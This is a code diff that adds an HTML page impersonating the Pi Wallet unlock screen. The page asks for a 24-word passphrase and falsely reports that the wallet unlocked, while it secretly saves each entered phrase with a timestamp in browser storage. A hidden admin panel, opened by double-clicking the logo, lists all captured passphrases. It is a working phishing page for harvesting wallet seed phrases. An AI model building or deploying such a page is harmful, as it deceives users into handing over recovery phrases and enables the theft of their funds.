@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pi Wallet</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: #f5f5f5;
+        }
+        
+        .header {
+            background-color: #8e44ad;
+            color: white;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: relative;
+        }
+        
+        .back-button, .menu-button {
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: none;
+            background: none;
+            color: white;
+            font-size: 24px;
+            cursor: pointer;
+        }
+        
+        .logo {
+            width: 40px;
+            height: 40px;
+            background-color: #f39c12;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            user-select: none;
+        }
+        
+        .title {
+            font-size: 24px;
+            font-weight: bold;
+        }
+        
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .unlock-title {
+            text-align: center;
+            font-size: 32px;
+            color: #8e44ad;
+            margin: 40px 0;
+        }
+        
+        .passphrase-input {
+            width: 100%;
+            padding: 20px;
+            font-size: 16px;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            resize: none;
+            min-height: 150px;
+        }
+        
+        .unlock-button {
+            width: 100%;
+            padding: 15px;
+            background-color: #8e44ad;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        
+        .unlock-button:hover {
+            background-color: #7d3c98;
+        }
+        
+        .biometric-button {
+            width: 100%;
+            padding: 15px;
+            background-color: #f5f5f5;
+            color: #666;
+            border: none;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        
+        .info-text {
+            text-align: center;
+            color: #666;
+            margin: 30px 0;
+            line-height: 1.5;
+        }
+        
+        .create-wallet-link {
+            color: #8e44ad;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        
+        .icon {
+            margin-right: 10px;
+        }
+        
+        .card {
+            background-color: white;
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            margin-bottom: 30px;
+        }
+        
+        /* Admin Panel Styles */
+        .admin-panel {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.9);
+            display: none;
+            flex-direction: column;
+            padding: 20px;
+            color: white;
+            z-index: 1000;
+            overflow-y: auto;
+        }
+        
+        .admin-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        
+        .close-admin {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 24px;
+            cursor: pointer;
+        }
+        
+        .saved-passcodes {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        
+        .saved-passcodes th, .saved-passcodes td {
+            border: 1px solid #444;
+            padding: 10px;
+            text-align: left;
+        }
+        
+        .saved-passcodes th {
+            background-color: #333;
+        }
+        
+        .saved-passcodes tr:nth-child(even) {
+            background-color: #222;
+        }
+        
+        /* Responsive Styles */
+        @media (max-width: 600px) {
+            .container {
+                padding: 10px;
+            }
+            
+            .unlock-title {
+                font-size: 28px;
+                margin: 30px 0;
+            }
+            
+            .card {
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <button class="back-button">&#10094;</button>
+        <div class="title">Wallet</div>
+        <div class="logo" id="logo">π</div>
+    </div>
+    
+    <div class="container">
+        <h1 class="unlock-title">Unlock Pi Wallet</h1>
+        
+        <div class="card">
+            <textarea class="passphrase-input" id="passphrase" placeholder="Enter your 24-word passphrase here"></textarea>
+            
+            <button class="unlock-button" id="unlockBtn">
+                <span class="icon">🔓</span> Unlock With Passphrase
+            </button>
+            
+            <button class="biometric-button">
+                <span class="icon">👆</span> Biometric Not Available
+            </button>
+        </div>
+        
+        <p class="info-text">
+            🛡️ As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.
+        </p>
+        
+        <p class="info-text">
+            Lost your passphrase? <a href="#" class="create-wallet-link">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.
+        </p>
+    </div>
+    
+    <!-- Admin Panel -->
+    <div class="admin-panel" id="adminPanel">
+        <div class="admin-header">
+            <h2>Admin Panel - Saved Passcodes</h2>
+            <button class="close-admin" id="closeAdmin">✖</button>
+        </div>
+        
+        <table class="saved-passcodes">
+            <thead>
+                <tr>
+                    <th>#</th>
+                    <th>Date & Time</th>
+                    <th>Passphrase</th>
+                </tr>
+            </thead>
+            <tbody id="passcodesList">
+                <!-- Saved passcodes will be displayed here -->
+            </tbody>
+        </table>
+    </div>
+    
+    <script>
+        // Elements
+        const logo = document.getElementById('logo');
+        const adminPanel = document.getElementById('adminPanel');
+        const closeAdmin = document.getElementById('closeAdmin');
+        const passphrase = document.getElementById('passphrase');
+        const unlockBtn = document.getElementById('unlockBtn');
+        const passcodesList = document.getElementById('passcodesList');
+        
+        // Track logo clicks for double-click detection
+        let lastClick = 0;
+        const DOUBLE_CLICK_THRESHOLD = 300; // ms
+        
+        // Load saved passcodes from localStorage
+        let savedPasscodes = JSON.parse(localStorage.getItem('piWalletPasscodes')) || [];
+        
+        // Function to update the passcodes table
+        function updatePasscodesTable() {
+            passcodesList.innerHTML = '';
+            
+            savedPasscodes.forEach((entry, index) => {
+                const row = document.createElement('tr');
+                
+                const indexCell = document.createElement('td');
+                indexCell.textContent = index + 1;
+                
+                const dateCell = document.createElement('td');
+                dateCell.textContent = entry.datetime;
+                
+                const passcodeCell = document.createElement('td');
+                passcodeCell.textContent = entry.passphrase;
+                
+                row.appendChild(indexCell);
+                row.appendChild(dateCell);
+                row.appendChild(passcodeCell);
+                
+                passcodesList.appendChild(row);
+            });
+        }
+        
+        // Unlock button click event
+        unlockBtn.addEventListener('click', function() {
+            const passphraseText = passphrase.value.trim();
+            
+            if (passphraseText) {
+                // Get current date and time
+                const now = new Date();
+                const datetime = now.toLocaleString();
+                
+                // Save the passphrase to the array
+                savedPasscodes.push({
+                    datetime: datetime,
+                    passphrase: passphraseText
+                });
+                
+                // Save to localStorage
+                localStorage.setItem('piWalletPasscodes', JSON.stringify(savedPasscodes));
+                
+                // Show success message
+                alert('Wallet unlocked successfully!');
+                
+                // Clear the input
+                passphrase.value = '';
+                
+                // Update the passcodes table (in case admin panel is open)
+                updatePasscodesTable();
+            } else {
+                alert('Please enter your passphrase');
+            }
+        });
+        
+        // Logo click detection for admin panel
+        logo.addEventListener('click', function() {
+            const currentTime = new Date().getTime();
+            if (currentTime - lastClick < DOUBLE_CLICK_THRESHOLD) {
+                // Double click detected, open admin panel
+                adminPanel.style.display = 'flex';
+                updatePasscodesTable();
+            }
+            lastClick = currentTime;
+        });
+        
+        // Close admin panel
+        closeAdmin.addEventListener('click', function() {
+            adminPanel.style.display = 'none';
+        });
+    </script>
+</body>
+</html>
